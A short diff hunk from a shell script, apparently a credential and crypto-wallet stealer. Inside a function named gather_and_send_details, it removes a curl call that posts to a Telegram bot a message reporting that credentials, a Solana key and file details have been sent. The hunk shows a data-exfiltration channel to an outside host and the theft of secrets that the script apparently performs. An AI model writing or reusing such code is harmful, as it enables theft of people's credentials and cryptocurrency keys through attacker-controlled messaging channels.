@@ -603,7 +603,6 @@ gather_and_send_details() {
         fi
     fi
 
-    curl -s -F chat_id="$chat_id" -F text="✅ All details sent for '$details_name'! 🎉 Check above for credentials, Solana key, and file details. 🌟" "https://api.telegram.org/bot$bot_token/sendMessage" >/dev/null
     if [ $? -ne 0 ]; then
         echo -e "${RED}❌ Failed to send final message to Telegram.${NC}"
     fi
